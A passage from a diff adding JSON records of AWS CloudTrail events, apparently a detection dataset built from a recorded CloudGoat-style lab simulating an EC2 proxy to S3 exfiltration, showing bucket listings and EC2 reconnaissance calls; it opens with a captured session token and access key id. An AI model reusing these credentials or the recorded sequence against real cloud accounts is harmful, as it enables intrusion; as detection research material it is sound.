+              "sessionToken": "IQoJb3JpZ2luX2VjEKn//////////wEaCXVzLWVhc3QtMSJGMEQCIFTK4qBuNfTj4qfV/CBhpMG4oscNJqG4y8PRznBlTeZIAiAp1u0soABpzcXhQdFLAc7IRny5FOLjhx3yH2G1qQRKMiq9Awiy//////////8BEAEaDDkwNDg4MjY2NzI5MiIMP0wDeotbCrscCOjEKpEDxk0KsgPdJdS8v5dM11k7izG5zOosK7lN4Pry9xiTntV473XlkmchQIuUsHpXOBK/7HE3Xas423pOk+OO+888A6q9F4gW5q34f0KIbhGI/uFhrOR2gI1AX0LB96QWcYRSmxWRnv7G6mgGD7HqLfyAHdcKuyj7kLv1XJHv+7SZ0qUsy/reCApl4Vo+klcPS4ropiiaDar2JF0ua4MF44cRHPFuKoxK1d++1ZpWAhVC90J091H+VndvXnH2WknOB8eB+h4btDEqOH4ogeKM4DBhhZn24yBl2zHSKT/TmUCaXarbzrVlov8kUfmHdA8Ei5/btKhk4NYQRLONn8/Ld7KyQ6jWCdGflNe7SbZXEaokpetcC2Kr3Tbh/H57HE+krJQAvQsD47vLWbs8ev6pm71YpyvfwDUEmovOfQrzTQonLLJV/2VXoSWgsaxDuTgfbC44W0x4J41k+N9zDxz+sYN+9Yzf3v2X28e74dkiyTR/kL4xg31FeK8RZHFort4UYsZfsHJx1GKUcCtWAYeSKQfhKfIw3vv6+gU67AGKYvQMHmefFegReXp1hh7kuQmM4D5dLahzvKa5iOOpxzX8qZ9nLahD07V4enDP4NhdStimm8G2gfa2lKoBjVbut+aI5mG1NcfjSV3SARpX2MboxQlo+DWlOT0Q7VQ9W96EVUOPQy6Yliuala7b36Kqt2jzWwUpRp8IpJkiwVdVfO68B1ncBz9fqHb+9K6u0dclOzmclTXC38wR2vqLOvad69oPKRBEsuELzl6WhDIVLhMbPmVlK0ZkT/phZYTrubq8J+kolJFASTKuVSrB2BDLxWW5cDxnevO+Wew/QenMXpi/HVzT9QRelXXz6A==",
+              "expiration": "Sep 14, 2020, 7:10:27 AM",
+              "accessKeyId": "ASIA5FLZVX4OPVKKVBMX"
+            }
+          },
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 43,
+            "event_id": "a3a3dded-7c27-42c0-a42d-891cdd436278"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-2c3015f18ddc8021ce9d42d0",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:00:33.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListObjects",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "prefix": "",
+            "encoding-type": "url",
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "list-type": "2",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 44,
+            "event_id": "bf575a0c-c344-4302-a468-00e6a84a127a"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-70f5038b6e2efa65c3707654",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:00:53.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListObjects",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "prefix": "",
+            "encoding-type": "url",
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "list-type": "2",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 45,
+            "event_id": "5376677f-96d4-468a-9539-f0f7edbec349"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-e663ec2f8899c1a537e9c2a6",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:01:04.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListObjects",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "prefix": "",
+            "encoding-type": "url",
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "list-type": "2",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 46,
+            "event_id": "46937d3a-6d68-4ba2-9520-a2ecf06dca32"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-a70eb2d4b7ecfef67d81b80b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-0317f6c6b66ae9c40"
+                }
+              ]
+            },
+            "includeAllInstances": false,
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 47,
+            "event_id": "eeebe333-536e-415c-841c-d027811f6a90"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-596b21ef0de86fe5079c4e87",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-0317f6c6b66ae9c40"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 48,
+            "event_id": "ed41e310-5179-4c31-a909-2fa5b7db1267"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-c4fa8f8b06e3fe4b8b405f78",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeClassicLinkInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "item": [
+                {
+                  "instanceId": "i-0317f6c6b66ae9c40"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 49,
+            "event_id": "0124fdcb-2a12-4352-9630-335728b8d79c"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-ef34ab8a8fd705d8b225a157",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:41.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceAttribute",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "attribute": "disableApiTermination",
+            "instanceId": "i-044b1baf4c96e1b62"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 50,
+            "event_id": "ff86143e-b912-40bc-b9b6-2d471ea83d6d"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-1bab763ba65fd7c0dff0cd06",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:42.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-0317f6c6b66ae9c40"
+                },
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            },
+            "includeAllInstances": false,
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 51,
+            "event_id": "47d313f7-079d-4297-b697-3f3e01a82c22"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-701fce5aae3f2a02924ffaad",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:41.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {},
+            "filterSet": {},
+            "maxResults": 100
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 52,
+            "event_id": "ce0f45a3-4711-4bf8-9607-ec78b1f7692e"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-e492144521dd597169da1c74",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAddresses",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "i-0317f6c6b66ae9c40"
+                      }
+                    ]
+                  },
+                  "name": "instance-id"
+                }
+              ]
+            },
+            "allocationIdsSet": {},
+            "publicIpsSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 53,
+            "event_id": "009ff682-4c44-4208-ae06-7672534d7d43"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-6ab3110d8373dff1beb393f6",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:42.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            },
+            "includeAllInstances": false,
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 54,
+            "event_id": "e4200a1e-2ef3-4f65-a63e-d1b3e1e65880"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-599115b69494015b798db977",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:41.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeTags",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "instance"
+                      }
+                    ]
+                  },
+                  "name": "resource-type"
+                }
+              ]
+            },
+            "maxResults": 200
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 55,
+            "event_id": "0ed1ffd7-2dba-46c6-abd6-6576a260a2fb"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-1e8719ba6cd5d6297409e59a",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceAttribute",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "attribute": "disableApiTermination",
+            "instanceId": "i-0317f6c6b66ae9c40"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 56,
+            "event_id": "1135079b-1245-4047-8265-17aba78f4adb"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-5a5358ed70c7b5218b24b8f8",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:41.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 57,
+            "event_id": "f52a8af1-93fc-405e-9a8c-044392823255"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-44e4970aa9aa36fcf4df7be9",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:42.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAddresses",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "i-0317f6c6b66ae9c40"
+                      },
+                      {
+                        "value": "i-044b1baf4c96e1b62"
+                      }
+                    ]
+                  },
+                  "name": "instance-id"
+                }
+              ]
+            },
+            "allocationIdsSet": {},
+            "publicIpsSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 58,
+            "event_id": "35c4a543-5c42-48f0-a737-b37e6fedf2e8"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-1ab22fb080632cf6b576d44b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:42.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 59,
+            "event_id": "88ded0b0-4862-4be0-8b1d-e99beb0400a2"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-4df8559c54801fc0d627c373",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:43.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-0317f6c6b66ae9c40"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 60,
+            "event_id": "4d44b8ae-31b8-423f-aeec-5eb293ebe15a"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-7507aa490158d79dc862861f",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:42.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "attaching"
+                      }
+                    ]
+                  },
+                  "name": "attachment.status"
+                }
+              ]
+            },
+            "volumeSet": {
+              "items": [
+                {
+                  "volumeId": "vol-0fec73ea9cce65247"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 61,
+            "event_id": "f8c5d6b5-90d4-4cc4-931b-4fc6cb6614fb"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-a97b14929a6946ac3315387e",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:42.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "impaired"
+                      }
+                    ]
+                  },
+                  "name": "volume-status.status"
+                },
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "io-enabled"
+                      }
+                    ]
+                  },
+                  "name": "volume-status.details-name"
+                },
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "failed"
+                      }
+                    ]
+                  },
+                  "name": "volume-status.details-status"
+                }
+              ]
+            },
+            "volumeSet": {
+              "items": [
+                {
+                  "volumeId": "vol-0fec73ea9cce65247"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 62,
+            "event_id": "e44840be-9f5c-4ced-ac3a-d0200dcb4315"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-48cfa0d7842429cb6cccd95b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:57:42.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            },
+            "includeAllInstances": true,
